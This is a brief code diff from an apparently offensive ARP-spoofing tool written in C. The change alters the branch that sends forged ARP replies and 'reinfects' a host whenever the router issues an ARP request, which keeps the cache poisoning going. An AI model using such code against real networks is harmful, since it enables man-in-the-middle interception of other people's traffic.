@@ -235,7 +235,7 @@ int main(int argc, char* argv[])
 					ArpReply(sendPacket, myMac, f.targetMac, f.targetIp, f.senderIp);
 					pcap_sendpacket(pcap, (const u_char*)&sendPacket, sizeof(sendPacket));
 				}  
-				else if (ntohs(arp->arp.op) == ARP_REQUEST && arp->arp.sip == htonl(f.targetIp) && arp->arp.tip == htonl(f.senderIp)) { 
+				if (ntohs(arp->arp.op) == ARP_REQUEST && arp->arp.sip == htonl(f.targetIp) && arp->arp.tip == htonl(f.senderIp)) { 
 					printf("[RECOVER]Router ARP request Reinfect!!\n"); 
 					infect(pcap, myMac, f); 
 				} 
